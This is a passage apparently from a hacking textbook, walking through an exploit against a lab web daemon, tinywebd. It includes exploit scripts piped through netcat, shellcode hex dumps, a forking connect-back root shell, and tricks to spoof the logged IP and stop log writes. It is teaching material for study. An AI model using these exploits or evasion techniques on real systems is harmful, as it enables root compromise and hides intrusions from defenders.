for the log file output,\nbut not when copying into memory. The recv_line() function uses \\r\\n as the\ndelimiter; however, all the other standard string functions use a null byte for\nthe delimiter. These string functions are used to write to the log file, so by\nstrategically using both delimiters, the data written to the log can be partially\nThe following exploit script puts a valid-looking request in front of the rest\nof the exploit buffer. The NOP sled is shrunk to accommodate the new data.\nFR_SIZE=$(perl -e \"print \\\"$FAKEREQUEST\\\"\" | wc -c | cut -f1 -d ' ')\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # At +100 bytes from buffer @ 0xbffff5c0\necho \"fake request: \\\"$FAKEREQUEST\\\" ($FR_SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE))\necho \"[Fake Request ($FR_SIZE b)] [NOP ($ALIGNED_SLED_SIZE b)] [shellcode\n(perl -e \"print \\\"$FAKEREQUEST\\\" . \\\"\\x90\\\"x$ALIGNED_SLED_SIZE\";\nperl -e \"print \\\"$RETADDR\\\"x32 . \\\"\\r\\n\\\"\") | nc -w 1 -v $2 80\nThis new exploit buffer uses the null byte delimiter to terminate the fake\nrequest camouflage. A null byte won\u2019t stop the recv_line() function, so the\nrest of the exploit buffer is copied to the stack. Since the string functions\nused to write to the log use a null byte for termination, the fake request is\nlogged and the rest of the exploit is hidden. The following output shows this\nreader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh loopback_shell 127.0.0.1\n[Fake Request (15 b)] [NOP (318 b)] [shellcode (83 b)] [ret addr (128 b)]\nThe connection used by this exploit creates the following log file entries\n08/02/2007 13:37:44> From 127.0.0.1:32828 \"GET / HTTP/1.1\"       200 OK\nEven though the logged IP address cannot be changed using this method,\nthe request itself appears valid, so it won\u2019t attract too much attention.\nIn a real-world scenario, the other obvious sign of intrusion is even more\napparent than log files. However, when testing, this is something that is easily\noverlooked. If log files seem like the most obvious sign of intrusion to you,\nthen you are forgetting about the loss of service. When the tinyweb daemon\nis exploited, the process is tricked into providing a remote root shell, but it\nno longer processes web requests. In a real-world scenario, this exploit would\nbe detected almost immediately when someone tries to access the website.\nA skilled hacker can not only crack open a program to exploit it, he can\nalso put the program back together again and keep it running. The program\ncontinues to process requests and it seems like nothing happened.\nComplex exploits are difficult because so many different things can go wrong,\nwith no indication of the root cause. Since it can take hours just to track down\nwhere the error occurred, it\u2019s usually better to break a complex exploit down\ninto smaller parts. The end goal is a piece of shellcode that will spawn a shell\nyet keep the tinyweb server running. The shell is interactive, which causes\nsome complications, so let\u2019s deal with that later. For now, the first step should\nbe figuring out how to put the tinyweb daemon back together after exploit-\ning it. Let\u2019s begin by writing a piece of shellcode that does something to prove\nit ran and then puts the tinyweb daemon back together so it can process fur-\nSince the tinyweb daemon redirects standard out to /dev/null, writing\nto standard out isn\u2019t a reliable marker for shellcode. One simple way to prove\nthe shellcode ran is to create a file. This can be done by making a call to open(),\nand then close(). Of course, the open() call will need the appropriate flags to\ncreate a file. We could look through the include files to figure out what O_CREAT\nand all the other necessary defines actually are and do all the bitwise math\nfor the arguments, but that\u2019s sort of a pain in the ass. If you recall, we\u2019ve done\nsomething like this already\u2014the notetaker program makes a call to open()\nwhich will create a file if it didn\u2019t exist. The strace program can be used on\nany program to show every system call it makes. In the output below, this is\nused to verify that the arguments to open() in C match up with the raw sys-\nexecve(\"./notetaker\", [\"./notetaker\", \"test\"], [/* 27 vars */]) = 0\nbrk(0)                                  = 0x804a000\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nmmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe5000\naccess(\"/etc/ld.so.preload\", R_OK)      = -1 ENOENT (No such file or directory)\nfstat64(3, {st_mode=S_IFREG|0644, st_size=70799, ..}) = 0\nmmap2(NULL, 70799, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd3000\naccess(\"/etc/ld.so.nohwcap\", F_OK)      = -1 ENOENT (No such file or directory)\nread(3, \"\\177ELF\\1\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\3\\0\\3\\0\\1\\0\\0\\0\\0`\\1\\000\".., 512) = 512\nfstat64(3, {st_mode=S_IFREG|0644, st_size=1307104, ..}) = 0\nmmap2(NULL, 1312164, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7e92000\nmmap2(0xb7fcd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x13b) =\nmmap2(0xb7fd0000, 9636, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) =\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7e91000\nset_thread_area({entry_number:-1 -> 6, base_addr:0xb7e916c0, limit:1048575, seg_32bit:1,\ncontents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0\nbrk(0)                                  = 0x804a000\nbrk(0x806b000)                          = 0x806b000\nfstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ..}) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe4000\nwrite(1, \"[DEBUG] buffer   @ 0x804a008: \\'t\".., 37[DEBUG] buffer   @ 0x804a008: 'test'\nwrite(1, \"[DEBUG] datafile @ 0x804a070: \\'/\".., 43[DEBUG] datafile @ 0x804a070: '/var/notes'\nopen(\"/var/notes\", O_WRONLY|O_APPEND|O_CREAT, 0600) = -1 EACCES (Permission denied)\nfcntl64(3, F_GETFL)                     = 0x2 (flags O_RDWR)\nfstat64(3, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 2), ..}) = 0\nmmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fe3000\n_llseek(3, 0, 0xbffff4e4, SEEK_CUR)     = -1 ESPIPE (Illegal seek)\nwrite(3, \"[!!] Fatal Error in main() while\".., 65[!!] Fatal Error in main() while opening file:\nfd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);\nWhen run through strace, the notetaker binary\u2019s suid-bit isn\u2019t used, so it\ndoesn\u2019t have permission to open the data file. That doesn\u2019t matter, though;\nwe just want to make sure the arguments to the open() system call match the\narguments to the open() call in C. Since they match, we can safely use the values\npassed to the open() function in the notetaker binary as the arguments for the\nopen() system call in our shellcode. The compiler has already done all the work\nof looking up the defines and mashing them together with a bitwise OR oper-\nation; we just need to find the call arguments in the disassembly of the note-\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n0x0804876f <main+16>:   mov    DWORD PTR [esp],0x64\n0x08048776 <main+23>:   call   0x8048601 <ec_malloc>\n0x0804877b <main+28>:   mov    DWORD PTR [ebp-12],eax\n0x0804877e <main+31>:   mov    DWORD PTR [esp],0x14\n0x08048785 <main+38>:   call   0x8048601 <ec_malloc>\n0x0804878a <main+43>:   mov    DWORD PTR [ebp-16],eax\n0x0804878d <main+46>:   mov    DWORD PTR [esp+4],0x8048a9f\n0x08048795 <main+54>:   mov    eax,DWORD PTR [ebp-16]\n0x0804879b <main+60>:   call   0x8048480 <strcpy@plt>\n0x080487a0 <main+65>:   cmp    DWORD PTR [ebp+8],0x1\n0x080487a6 <main+71>:   mov    eax,DWORD PTR [ebp-16]\n0x080487a9 <main+74>:   mov    DWORD PTR [esp+4],eax\n0x080487ad <main+78>:   mov    eax,DWORD PTR [ebp+12]\n0x080487ba <main+91>:   mov    eax,DWORD PTR [ebp+12]\n0x080487c2 <main+99>:   mov    DWORD PTR [esp+4],eax\n0x080487c6 <main+103>:  mov    eax,DWORD PTR [ebp-12]\n0x080487cc <main+109>:  call   0x8048480 <strcpy@plt>\n0x080487d1 <main+114>:  mov    eax,DWORD PTR [ebp-12]\n0x080487d4 <main+117>:  mov    DWORD PTR [esp+8],eax\n0x080487d8 <main+121>:  mov    eax,DWORD PTR [ebp-12]\n0x080487db <main+124>:  mov    DWORD PTR [esp+4],eax\n0x080487df <main+128>:  mov    DWORD PTR [esp],0x8048aaa\n0x080487e6 <main+135>:  call   0x8048490 <printf@plt>\n0x080487eb <main+140>:  mov    eax,DWORD PTR [ebp-16]\n0x080487ee <main+143>:  mov    DWORD PTR [esp+8],eax\n0x080487f2 <main+147>:  mov    eax,DWORD PTR [ebp-16]\n0x080487f5 <main+150>:  mov    DWORD PTR [esp+4],eax\n0x080487f9 <main+154>:  mov    DWORD PTR [esp],0x8048ac7\n0x08048800 <main+161>:  call   0x8048490 <printf@plt>\n0x08048805 <main+166>:  mov    DWORD PTR [esp+8],0x180\n0x0804880d <main+174>:  mov    DWORD PTR [esp+4],0x441\n0x08048815 <main+182>:  mov    eax,DWORD PTR [ebp-16]\n0x0804881b <main+188>:  call   0x8048410 <open@plt>\n---Type <return> to continue, or q <return> to quit---q\nRemember that the arguments to a function call will be pushed to the\nstack in reverse. In this case, the compiler decided to use mov DWORD PTR\n[esp+offset], value_to_push_to_stack instead of push instructions, but the\nstructure built on the stack is equivalent. The first argument is a pointer to\nthe name of the file in EAX, the second argument (put at [esp+4]) is 0x441,\nand the third argument (put at [esp+8]) is 0x180. This means that O_WRONLY|\nO_CREAT|O_APPEND turns out to be 0x441 and S_IRUSR|S_IWUSR is 0x180. The\nfollowing shellcode uses these values to create a file called Hacked in the\nmov ebx, eax         ; File descriptor to second arg\nThe shellcode opens a file to create it and then immediately closes the\nfile. Finally, it calls exit to avoid an infinite loop. The output below shows this\n00000000  eb 23 5b 31 c9 88 4b 07  6a 05 58 66 b9 41 04 31  |.#[1.K.j.Xf.A.1|\n00000010  d2 66 ba 80 01 cd 80 89  c3 6a 06 58 cd 80 31 c0  |.f....j.X.1.|\n00000020  89 c3 40 cd 80 e8 d8 ff  ff ff 2f 48 61 63 6b 65  |.@..../Hacke|\n00000030  64 58                                             |dX|\nreader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh mark 127.0.0.1\n[Fake Request (15 b)] [NOP (357 b)] [shellcode (44 b)] [ret addr (128 b)]\n-rw------- 1 root reader 0 2007-09-17 16:59 /Hacked\nTo put things back together again, we just need to repair any collateral damage\ncaused by the overwrite and/or shellcode, and then jump execution back\ninto the connection accepting loop in main(). The disassembly of main() in\nthe output below shows that we can safely return to the addresses 0x08048f64,\n0x08048f65, or 0x08048fb7 to get back into the connection accept loop.\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n0x08048f4e <main+443>:  call   0x8048860 <listen@plt>\n0x08048f56 <main+451>:  jne    0x8048f64 <main+465>\n0x08048f58 <main+453>:  mov    DWORD PTR [esp],0x804961a\n0x08048f65 <main+466>:  mov    DWORD PTR [ebp-60],0x10\n0x08048f6f <main+476>:  mov    DWORD PTR [esp+8],eax\n0x08048f76 <main+483>:  mov    DWORD PTR [esp+4],eax\n0x08048f82 <main+495>:  call   0x80488d0 <accept@plt>\n0x08048f87 <main+500>:  mov    DWORD PTR [ebp-12],eax\n0x08048f8a <main+503>:  cmp    DWORD PTR [ebp-12],0xffffffff\n0x08048f8e <main+507>:  jne    0x8048f9c <main+521>\n0x08048f90 <main+509>:  mov    DWORD PTR [esp],0x804962e\n0x08048fa1 <main+526>:  mov    DWORD PTR [esp+8],eax\n0x08048fa8 <main+533>:  mov    DWORD PTR [esp+4],eax\n0x08048fac <main+537>:  mov    eax,DWORD PTR [ebp-12]\n0x08048fb2 <main+543>:  call   0x8048fb9 <handle_connection>\n0x08048fb7 <main+548>:  jmp    0x8048f65 <main+466>\nAll three of these addresses basically go to the same place. Let\u2019s\nuse 0x08048fb7 since this is the original return address used for the call to\nhandle_connection(). However, there are other things we need to fix first.\nLook at the function prologue and epilogue for handle_connection(). These\nare the instructions that set up and remove the stack frame structures on\nDump of assembler code for function handle_connection:\n0x08048fba <handle_connection+1>:       mov    ebp,esp\n0x08048fbd <handle_connection+4>:       sub    esp,0x644\n0x08048fc3 <handle_connection+10>:      lea    eax,[ebp-0x218]\n0x08048fc9 <handle_connection+16>:      mov    DWORD PTR [esp+4],eax\n0x08048fcd <handle_connection+20>:      mov    eax,DWORD PTR [ebp+8]\n0x08048fd0 <handle_connection+23>:      mov    DWORD PTR [esp],eax\n0x08048fd3 <handle_connection+26>:      call   0x8048cb0 <recv_line>\n0x08048fd8 <handle_connection+31>:      mov    DWORD PTR [ebp-0x620],eax\n0x08048fde <handle_connection+37>:      mov    eax,DWORD PTR [ebp+12]\n0x08048fe1 <handle_connection+40>:      movzx  eax,WORD PTR [eax+2]\n0x08048fe5 <handle_connection+44>:      mov    DWORD PTR [esp],eax\n0x08048fe8 <handle_connection+47>:      call   0x80488f0 <ntohs@plt>\n0x08049302 <handle_connection+841>:     call   0x8048850 <write@plt>\n0x08049307 <handle_connection+846>:     mov    DWORD PTR [esp+4],0x2\n0x0804930f <handle_connection+854>:     mov    eax,DWORD PTR [ebp+8]\n0x08049312 <handle_connection+857>:     mov    DWORD PTR [esp],eax\n0x08049315 <handle_connection+860>:     call   0x8048800 <shutdown@plt>\n0x0804931a <handle_connection+865>:     add    esp,0x644\nAt the beginning of the function, the function prologue saves the current\nvalues of the EBP and EBX registers by pushing them to the stack, and sets\nEBP to the current value of ESP so it can be used as a point of reference for\naccessing stack variables. Finally, 0x644 bytes are saved on the stack for these\nstack variables by subtracting from ESP. The function epilogue at the end\nrestores ESP by adding 0x644 back to it and restores the saved values of EBX\nand EBP by popping them from the stack back into the registers.\nThe overwrite instructions are actually found in the recv_line() func-\ntion; however, they write to data in the handle_connection() stack frame, so\nthe overwrite itself happens in handle_connection(). The return address that\nwe overwrite is pushed to the stack when handle_connection() is called, so the\nsaved values for EBP and EBX pushed to the stack in the function prologue\nwill be between the return address and the corruptible buffer. This means\nthat EBP and EBX will get mangled when the function epilogue executes.\nSince we don\u2019t gain control of the program\u2019s execution until the return\ninstruction, all the instructions between the overwrite and the return instruc-\ntion must be executed. First, we need to assess how much collateral damage\nis done by these extra instructions after the overwrite. The assembly instruct-\nion int3 creates the byte 0xcc, which is literally a debugging breakpoint.\nThe shellcode below uses an int3 instruction instead of exiting. This break-\npoint will be caught by GDB, allowing us to examine the exact state of the\nmov ebx, eax         ; File descriptor to second arg\nTo use this shellcode, first get GDB set up to debug the tinyweb daemon.\nIn the output below, a breakpoint is set right before handle_connection() is\ncalled. The goal is to restore the mangled registers to their original state\nroot     23497  0.0  0.0   1636   356 ?        Ss   17:08   0:00 ./tinywebd\nreader   23506  0.0  0.0   2880   748 pts/1    R+   17:09   0:00 grep tinywebd\nreader@hacking:~/booksrc $ sudo gdb -q -pid=23497 --symbols=./a.out\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n/cow/home/reader/booksrc/tinywebd: No such file or directory.\nA program is being debugged already.  Kill it? (y or n) n\n0x8048fa8 <main+533>:   mov    DWORD PTR [esp+4],eax\n0x8048fac <main+537>:   mov    eax,DWORD PTR [ebp-12]\n0x8048fb2 <main+543>:   call   0x8048fb9 <handle_connection>\n0x8048fb7 <main+548>:   jmp    0x8048f65 <main+466>\nBreakpoint 1 at 0x8048fb2: file tinywebd.c, line 72.\nIn the output above, a breakpoint is set right before handle_connection() is\ncalled (shown in bold). Then, in another terminal window, the exploit tool is\nused to throw the new shellcode at it. This will advance execution to the break-\nreader@hacking:~/booksrc $ ./xtool_tinywebd.sh mark_break 127.0.0.1\n[NOP (372 bytes)] [shellcode (44 bytes)] [ret addr (128 bytes)]\nBack in the debugging terminal, the first breakpoint is encountered.\nSome important stack registers are displayed, which show the stack setup\nbefore (and after) the handle_connection() call. Then, execution continues\nto the int3 instruction in the shellcode, which acts like a breakpoint. Then\nthese stack registers are checked again to view their state at the moment the\nBreakpoint 1, 0x08048fb2 in main () at tinywebd.c:72\n72            handle_connection(new_sockfd, &client_addr, logfd);\nProgram received signal SIGTRAP, Trace/breakpoint trap.\nThis output shows that EBX and EBP are changed at the point the shell-\ncode begins execution. However, an inspection of the instructions in main()\u2019s\ndisassembly shows that EBX isn\u2019t actually used. The compiler probably saved\nthis register to the stack due to some rule about calling convention, even\nthough it isn\u2019t really used. EBP, however, is used heavily, since it\u2019s the point\nof reference for all local stack variables. Because the original saved value of\nEBP was overwritten by our exploit, the original value must be recreated.\nWhen EBP is restored to its original value, the shellcode should be able\nto do its dirty work and then return back into main() as usual. Since com-\nputers are deterministic, the assembly instructions will clearly explain how\n0x8048fa8 <main+533>:   mov    DWORD PTR [esp+4],eax\n0x8048fac <main+537>:   mov    eax,DWORD PTR [ebp-12]\n0x8048fb2 <main+543>:   call   0x8048fb9 <handle_connection>\n0x8048fb7 <main+548>:   jmp    0x8048f65 <main+466>\nA quick glance at the function prologue for main() shows that EBP should\nbe 0x68 bytes larger than ESP. Since ESP wasn\u2019t damaged by our exploit, we\ncan restore the value for EBP by adding 0x68 to ESP at the end of our shell-\ncode. With EBP restored to the proper value, the program execution can\nbe safely returned into the connection-accepting loop. The proper return\naddress for the handle_connection() call is the instruction found after the call\nat 0x08048fb7. The following shellcode uses this technique.\nmov ebx, eax         ; File descriptor to second arg\nWhen assembled and used in an exploit, this shellcode will restore the\ntinyweb daemon\u2019s execution after marking the filesystem. The tinyweb\n00000000  eb 26 5b 31 c9 88 4b 07  6a 05 58 66 b9 41 04 31  |.&[1.K.j.Xf.A.1|\n00000010  d2 66 ba 80 01 cd 80 89  c3 6a 06 58 cd 80 8d 6c  |.f....j.X..l|\n00000020  24 68 68 b7 8f 04 08 c3  e8 d5 ff ff ff 2f 48 61  |$hh...../Ha|\n00000030  63 6b 65 64 58                                    |ckedX|\nreader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh mark_restore 127.0.0.1\n[Fake Request (15 b)] [NOP (348 b)] [shellcode (53 b)] [ret addr (128 b)]\n-rw------- 1 root reader 0 2007-09-19 20:37 /Hacked\nroot     26787  0.0  0.0   1636   420 ?        Ss   20:37   0:00 ./tinywebd\nreader   26828  0.0  0.0   2880   748 pts/1    R+   20:38   0:00 grep tinywebd\nreader@hacking:~/booksrc $ ./webserver_id 127.0.0.1\nNow that the difficult part is figured out, we can use this technique to silently\nspawn a root shell. Since the shell is interactive, but we still want the process\nto handle web requests, we need to fork to a child process. The fork() call\ncreates a child process that is an exact copy of the parent, except that it returns\n0 in the child process and the new process ID in the parent process. We want\nour shellcode to fork and the child process to serve up the root shell, while\nthe parent process restores tinywebd\u2019s execution. In the shellcode below,\nseveral instructions are added to the start of loopback_shell.s. First, the fork\nsyscall is made, and the return value is put in the EAX register. The next few\ninstructions test to see if EAX is zero. If EAX is zero, we jump to child_process\nto spawn the shell. Otherwise, we\u2019re in the parent process, so the shellcode\nint 0x80          ; After the fork, in child process eax == 0.\njz child_process  ; In child process spawns a shell.\npush BYTE 0x66    ; Socketcall is syscall #102 (0x66)\ncdq               ; Zero out edx for use as a null DWORD later.\npush edx          ; Build arg array: { protocol = 0,\npush BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,\npush BYTE 0x2     ;                    AF_INET = 2 }\nint 0x80          ; After syscall, eax has socket file descriptor.\n.: [ Output trimmed; the rest is the same as loopback_shell.s. ] :.\nThe following listing shows this shellcode in use. Multiple jobs are used\ninstead of multiple terminals, so the netcat listener is sent to the background\nby ending the command with an ampersand (&). After the shell connects\nback, the fg command brings the listener back to the foreground. The process\nis then suspended by hitting CTRL-Z, which returns to the BASH shell. It might\nbe easier for you to use multiple terminals as you are following along, but job\ncontrol is useful to know for those times when you don\u2019t have the luxury of\nreader@hacking:~/booksrc $ nasm loopback_shell_restore.s\nreader@hacking:~/booksrc $ hexdump -C loopback_shell_restore\n00000000  6a 02 58 cd 80 85 c0 74  0a 8d 6c 24 68 68 b7 8f  |j.X..t.l$hh.|\n00000010  04 08 c3 6a 66 58 99 31  db 43 52 6a 01 6a 02 89  |..jfX.1.CRj.j.|\n00000020  e1 cd 80 96 6a 66 58 43  68 7f bb bb 01 66 89 54  |..jfXCh..f.T|\n00000030  24 01 66 68 7a 69 66 53  89 e1 6a 10 51 56 89 e1  |$.fhzifS.j.QV.|\n00000040  43 cd 80 87 f3 87 ce 49  b0 3f cd 80 49 79 f9 b0  |C...I.?.Iy.|\n00000050  0b 52 68 2f 2f 73 68 68  2f 62 69 6e 89 e3 52 89  |.Rh//shh/bin.R.|\n00000060  e2 53 89 e1 cd 80                                 |.S..|\nreader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh loopback_shell_restore 127.0.0.1\n[Fake Request (15 b)] [NOP (299 b)] [shellcode (102 b)] [ret addr (128 b)]\nreader@hacking:~/booksrc $ ./webserver_id 127.0.0.1\nWith this shellcode, the connect-back root shell is maintained by a\nseparate child process, while the parent process continues to serve web\nOur current stealth exploit only camouflages the web request; however, the\nIP address and timestamp are still written to the log file. This type of camou-\nflage will make the attacks harder to find, but they are not invisible. Having\nyour IP address written to logs that could be kept for years might lead to\ntrouble in the future. Since we\u2019re mucking around with the insides of the\ntinyweb daemon now, we should be able to hide our presence even better.\nThe IP address written to the log file comes from the client_addr_ptr, which is\nvoid handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {\nunsigned char *ptr, request[500], resource[500], log_buffer[500];\nsprintf(log_buffer, \"From %s:%d \\\"%s\\\"\\t\", inet_ntoa(client_addr_ptr->sin_addr),\nTo spoof the IP address, we just need to inject our own sockaddr_in\nstructure and overwrite the client_addr_ptr with the address of the injected\nstructure. The best way to generate a sockaddr_in structure for injection is to\nwrite a little C program that creates and dumps the structure. The following\nsource code builds the struct using command-line arguments and then writes\nthe struct data directly to file descriptor 1, which is standard output.\nprintf(\"Usage: %s <target IP> <target port>\\n\", argv[0]);\nThis program can be used to inject a sockaddr_in structure. The output\nbelow shows the program being compiled and executed.\nreader@hacking:~/booksrc $ gcc -o addr_struct addr_struct.c\nreader@hacking:~/booksrc $ ./addr_struct 12.34.56.78 9090\nreader@hacking:~/booksrc $ ./addr_struct 12.34.56.78 9090 | hexdump -C\n00000000  02 00 23 82 0c 22 38 4e  00 00 00 00 f4 5f fd b7  |.#.\"8N..._.|\nTo integrate this into our exploit, the address structure is injected after\nthe fake request but before the NOP sled. Since the fake request is 15 bytes\nlong and we know the buffer starts at 0xbffff5c0, the fake address will be\nreader@hacking:~/booksrc $ grep 0x xtool_tinywebd_steath.sh\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # at +100 bytes from buffer @ 0xbffff5c0\nreader@hacking:~/booksrc $ gdb -q -batch -ex \"p /x 0xbffff5c0 + 15\"\nSince the client_addr_ptr is passed as a second function argument, it will\nbe on the stack two dwords after the return address. The following exploit\nscript injects a fake address structure and overwrites client_addr_ptr.\n# IP spoofing stealth exploitation tool for tinywebd\nFR_SIZE=$(perl -e \"print \\\"$FAKEREQUEST\\\"\" | wc -c | cut -f1 -d ' ')\nRETADDR=\"\\x24\\xf6\\xff\\xbf\" # At +100 bytes from buffer @ 0xbffff5c0\nFAKEADDR=\"\\xcf\\xf5\\xff\\xbf\" # +15 bytes from buffer @ 0xbffff5c0\necho \"fake request: \\\"$FAKEREQUEST\\\" ($FR_SIZE bytes)\"\nALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))\necho \"[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] [ret\nperl -e \"print \\\"$RETADDR\\\"x32 . \\\"$FAKEADDR\\\"x2 . \\\"\\r\\n\\\"\") | nc -w 1 -v $2 80\nThe best way to explain exactly what this exploit script does is to watch\ntinywebd from within GDB. In the output below, GDB is used to attach to the\nrunning tinywebd process, breakpoints are set before the overflow, and the\nroot     27264  0.0  0.0   1636   420 ?        Ss   20:47   0:00 ./tinywebd\nreader   30648  0.0  0.0   2880   748 pts/2    R+   22:29   0:00 grep tinywebd\nreader@hacking:~/booksrc $ sudo gdb -q\u2014pid=27264 --symbols=./a.out\nwarning: not using untrusted file \"/home/reader/.gdbinit\"\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n/cow/home/reader/booksrc/tinywebd: No such file or directory.\nA program is being debugged already.  Kill it? (y or n) n\n77      /* This function handles the connection on the passed socket from the\n78       * passed client address and logs to the passed FD. The connection is\n79       * processed as a web request, and this function replies over the connected\n80       * socket.  Finally, the passed socket is closed at the end of the function.\n82      void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr, int logfd) {\n83         unsigned char *ptr, request[500], resource[500], log_buffer[500];\n88         sprintf(log_buffer, \"From %s:%d \\\"%s\\\"\\t\", inet_ntoa(client_addr_ptr->sin_addr),\n90         ptr = strstr(request, \" HTTP/\"); // Search for valid looking request.\n91         if(ptr == NULL) { // Then this isn't valid HTTP\n94            *ptr = 0; // Terminate the buffer at the end of the URL.\n95            ptr = NULL; // Set ptr to NULL (used to flag for an invalid request).\n96            if(strncmp(request, \"GET \", 4) == 0)  // Get request\nBreakpoint 1 at 0x8048fc3: file tinywebd.c, line 86.\nBreakpoint 2 at 0x8049028: file tinywebd.c, line 89.\nThen, from another terminal, the new spoofing exploit is used to advance\nreader@hacking:~/booksrc $ ./xtool_tinywebd_spoof.sh mark_restore 127.0.0.1\n[Fake Request 15] [spoof IP 16] [NOP 332] [shellcode 53] [ret addr 128]\nBack in the debugging terminal, the first breakpoint is hit.\nBreakpoint 1, handle_connection (sockfd=9, client_addr_ptr=0xbffff810, logfd=3) at\n#0  handle_connection (sockfd=9, client_addr_ptr=0xbffff810, logfd=3) at tinywebd.c:86\n$2 = {sin_family = 2, sin_port = 15284, sin_addr = {s_addr = 16777343},\n0xbffff7b4:     0xbffff624      0xbffff624      0xbffff624      0xbffff624\n0xbffff7c4:     0xbffff624      0xbffff624      0x0804b030      0xbffff624\n0xbffff7d4:     0x00000009      0xbffff848      0x08048fb7      0x00000009\n0xbffff7e4:     0xbffff810      0x00000003      0xbffff838      0x00000004\n0xbffff7f4:     0x00000000      0x00000000      0x08048a30      0x00000000\n0xbffff804:     0x0804a8c0      0xbffff818      0x00000010      0x3bb40002\nBreakpoint 2, handle_connection (sockfd=-1073744433, client_addr_ptr=0xbffff5cf, logfd=2560)\n90         ptr = strstr(request, \" HTTP/\"); // Search for valid-looking request.\n0xbffff7b4:     0xbffff624      0xbffff624      0xbffff624      0xbffff624\n0xbffff7c4:     0xbffff624      0xbffff624      0xbffff624      0xbffff624\n0xbffff7d4:     0xbffff624      0xbffff624      0xbffff624      0xbffff5cf\n0xbffff7e4:     0xbffff5cf      0x00000a00      0xbffff838      0x00000004\n0xbffff7f4:     0x00000000      0x00000000      0x08048a30      0x00000000\n0xbffff804:     0x0804a8c0      0xbffff818      0x00000010      0x3bb40002\n$5 = {sin_family = 2, sin_port = 33315, sin_addr = {s_addr = 1312301580},\n0xbffff1c0:      \"From 12.34.56.78:9090 \\\"GET / HTTP/1.1\\\"\\t\"\nAt the first breakpoint, client_addr_ptr is shown to be at 0xbffff7e4 and\npointing to 0xbffff810. This is found in memory on the stack two dwords after\nthe return address. The second breakpoint is after the overwrite, so the\nclient_addr_ptr at 0xbffff7e4 is shown to be overwritten with the address\nof the injected sockaddr_in structure at 0xbffff5cf. From here, we can peek\nat the log_buffer before it\u2019s written out to the log to verify the address\nIdeally, we want to leave no trace at all. In the setup on the LiveCD, technically\nyou can just delete the log files after you get a root shell. However, let\u2019s assume\nthis program is part of a secure infrastructure where the log files are mirrored\nto a secure logging server that has minimal access or maybe even a line\nprinter. In these cases, deleting the log files after the fact is not an option.\nThe timestamp() function in the tinyweb daemon tries to be secure by writing\ndirectly to an open file descriptor. We can\u2019t stop this function from being\ncalled, and we can\u2019t undo the write it does to the log file. This would be a\nfairly effective countermeasure; however, it was implemented poorly. In fact,\nin the previous exploit, we stumbled upon this problem.\nEven though logfd is a global variable, it is also passed to handle_connection()\nas a function argument. From the discussion of functional context, you should\nremember that this creates another stack variable with the same name, logfd.\nSince this argument is found right after the client_addr_ptr on the stack, it\ngets partially overwritten by the null terminator and the extra 0x0a byte found\n0xbffff7e4:     0xcf    0xf5    0xff    0xbf    0x00    0x0a    0x00    0x00\nThe program is running.  Quit anyway (and detach it)? (y or n) y\nAs long as the log file descriptor doesn\u2019t happen to be 2560 (0x0a00 in\nhexadecimal), every time handle_connection() tries to write to the log it will\nfail. This effect can be quickly explored using strace. In the output below,\nstrace is used with the -p command-line argument to attach to a running\nprocess. The -e trace=write argument tells strace to only look at write calls.\nOnce again, the spoofing exploit tool is used in another terminal to connect\nroot       478  0.0  0.0   1636   420 ?        Ss   23:24   0:00 ./tinywebd\nreader     525  0.0  0.0   2880   748 pts/1    R+   23:24   0:00 grep tinywebd\nreader@hacking:~/booksrc $ sudo strace -p 478 -e trace=write\nwrite(2560, \"09/19/2007 23:29:30> \", 21) = -1 EBADF (Bad file descriptor)\nwrite(2560, \"From 12.34.56.78:9090 \\\"GET / HTT\".., 47) = -1 EBADF (Bad file descriptor)\nThis output clearly shows the attempts to write to the log file failing.\nNormally, we wouldn\u2019t be able to overwrite the logfd variable, since the\nclient_addr_ptr is in the way. Carelessly mangling this pointer will usually\nlead to a crash. But since we\u2019ve made sure this variable points to valid memory\n(our injected spoofed address structure), we\u2019re free to overwrite the vari-\nables that lie beyond it. Since the tinyweb daemon redirects standard out to\n/dev/null, the next exploit script will overwrite the passed logfd variable\nwith 1, for standard output. This will still prevent entries from being written\nto the log file but in a much nicer way\u2014without errors.\nFR_SIZE=$(perl -e \"print 